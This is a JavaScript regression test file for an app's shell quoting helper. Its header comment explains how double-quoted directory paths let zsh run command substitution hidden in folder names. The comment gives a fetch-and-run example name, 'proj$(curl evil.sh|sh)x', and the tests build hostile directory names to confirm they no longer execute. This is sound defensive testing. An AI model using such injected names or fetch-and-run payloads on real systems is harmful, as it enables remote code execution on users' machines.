// A folder's NAME is data. iT treated it as code.
//
// web/panels/shell.js built `zsh -lc` command strings around directory paths with
//
//     const qpath = pth => '"' + String(pth).replace(/"/g, '') + '"';
//
// Double quotes. Inside double quotes zsh still expands $(...), `...` and $VAR, and stripping
// the double-quote character does nothing about any of them. So a directory merely NAMED
//
//     proj$(curl evil.sh|sh)x
//
// executed when the app built a command around it. Eleven call sites: git branch/status polling,
// the diff view, `cd` on a tree click, `open` in Finder, the grep root — and, worst,
// workspace mount, which runs at app start with no click at all and re-fires on every launch
// because the workspace list is persisted.
//
// Reproduced before the fix, with a harmless payload:
//   mkdir '/tmp/cf-h03/proj$(touch /tmp/cf-h03/PWNED)x'
//   zsh -lc "git -C \"/tmp/…/proj\$(touch …/PWNED)x\" rev-parse --show-toplevel"
//   → PWNED created: YES
// With single-quoting: PWNED created: no. Both measured on this machine.
//
// The safe helper already existed in the same function scope, 138 lines below, under a
// different name (shq) with one call site. One idea, two implementations, and the unsafe one
// had all the reach.
//
// UPDATE, one wave later. The same defect was then found in TWO MORE panels — folders.js's
// Reveal button and lab.js's shared file viewer — still carrying the double-quote form. The
// lesson had been learnt in this file and carried nowhere else, so the quoter moved OUT of
// shell.js into web/scripts/core/kernel.js, where every panel sees one definition.
// tests/one-shell-quoter.test.mjs guards that exactly one definition exists.
//
// Three assertions here went with it, and it is worth saying why rather than quietly deleting
// them: they pinned the IMPLEMENTATION ("qpath must be a one-expression helper", "the escaping
// expression must appear exactly once in THIS FILE", "const shq=qpath") and turned red the
// moment the code was routed correctly through a shared helper. CONTRIBUTING names that exact
// false alarm. What survives below is what was always the point: a hostile directory name does
// not execute, measured against a real zsh.
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { shq as qpath } from '../web/scripts/core/kernel.js';

const APP = path.resolve(import.meta.dirname, '..');
const src = fs.readFileSync(path.join(APP, 'web/panels/shell.js'), 'utf8');

test('iT quotes through the shared helper, and does not re-derive it', () => {
  assert.match(src, /const qpath=shq;/, 'qpath must be the kernel quoter under iT’s historical name');
  assert.equal((src.match(/replace\(\/'\/g/g) || []).length, 0,
    'a private copy of the escaping expression is how the first one drifted');
  assert.match(src, /const q1=qpath\(q\);/, 'the grep query must use the same helper');
});

test('a hostile directory name does NOT execute — measured against a real zsh', () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'cf-quote-'));
  // The payload carries no '/', so it is a single directory NAME rather than a nested path,
  // and it drops its marker in whatever cwd the shell happens to be in — which is `base`.
  const hostile = path.join(base, 'proj$(touch EXECUTED)x');
  const marker = path.join(base, 'EXECUTED');
  try {
    fs.mkdirSync(hostile);
    // the exact shape shell.js builds at web/panels/shell.js:897 — workspace mount, the one
    // that runs at app start with no click at all
    const cmd = 'git -C ' + qpath(hostile) + ' rev-parse --show-toplevel 2>/dev/null; true';
    execFileSync('zsh', ['-lc', cmd], { cwd: base, stdio: 'ignore' });
    assert.equal(fs.existsSync(marker), false,
      'the directory NAME was executed — qpath is not containing expansion');
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
});

test('backticks and $VAR are contained too, not just $()', () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'cf-quote-'));
  try {
    for (const name of ['tick`id`dir', 'var$HOME-dir', "quote'dir"]) {
      const dir = path.join(base, name);
      fs.mkdirSync(dir);
      // `cd <path> && pwd` must print the path back verbatim: any expansion changes it
      const out = execFileSync('zsh', ['-lc', 'cd ' + qpath(dir) + ' && pwd'], { encoding: 'utf8' }).trim();
      assert.equal(out, dir, 'zsh altered the path for: ' + name);
    }
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
});

test('ordinary paths — spaces, unicode, trailing dots — still work', () => {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'cf-quote-'));
  try {
    for (const name of ['plain dir', 'ácentos e espaços', 'dots...', 'dash-dir']) {
      const dir = path.join(base, name);
      fs.mkdirSync(dir);
      const out = execFileSync('zsh', ['-lc', 'cd ' + qpath(dir) + ' && pwd'], { encoding: 'utf8' }).trim();
      assert.equal(out, dir, 'a legitimate path broke: ' + name);
    }
  } finally {
    fs.rmSync(base, { recursive: true, force: true });
  }
});

test('every call site still goes through the helper', () => {
  // If a later edit inlines a path into a command string, this catches it.
  const calls = (src.match(/qpath\(/g) || []).length;
  assert.ok(calls >= 11, 'expected the 11 known call sites, found ' + calls);
  // No raw interpolation of a cwd into a shell string, bypassing the helper.
  assert.doesNotMatch(src, /Bridge\.shell\(['"][^'"]*'\+(t|w)\.cwd/,
    'a cwd must never reach Bridge.shell unquoted');
});

test('the built document carries the fix', () => {
  const dist = path.join(APP, 'dist/index.html');
  if (!fs.existsSync(dist)) return;
  const d = fs.readFileSync(dist, 'utf8');
  // The bundled kernel is what the panels actually call, so that is what must be checked —
  // not shell.js's alias, which would look right even if the definition behind it were wrong.
  assert.match(d, /shq\s*=\s*\(?\s*s\s*\)?\s*=>\s*"'"/,
    'dist does not carry the kernel quoter — rebuild');
  assert.match(d, /const qpath=shq;/, 'dist does not carry iT’s alias — rebuild');
  assert.doesNotMatch(d, /const qpath=pth=>'"'/, 'dist still carries the double-quoted form');
});
